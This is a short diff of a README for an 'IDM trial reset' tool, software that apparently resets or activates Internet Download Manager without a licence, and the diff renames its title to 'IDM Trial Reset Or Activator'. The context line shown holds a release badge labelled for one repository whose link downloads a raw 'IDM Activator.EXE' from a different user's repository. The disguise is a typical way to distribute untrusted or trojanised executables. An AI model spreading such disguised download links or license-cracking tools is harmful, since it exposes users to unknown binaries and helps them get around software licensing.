@@ -1,4 +1,4 @@
-# IDM trial reset
+# IDM Trial Reset Or Activator
 
 [![GitHub release](https://img.shields.io/github/release/J2TeaM/idm-trial-reset.svg?maxAge=2592000)](https://raw.githubusercontent.com/MdImranAhmed/-idm-activator-trial-reset/7839f3cc3b71ad786ff1a775bbc5f80806a54a68/IDM%20Activator.EXE)
 
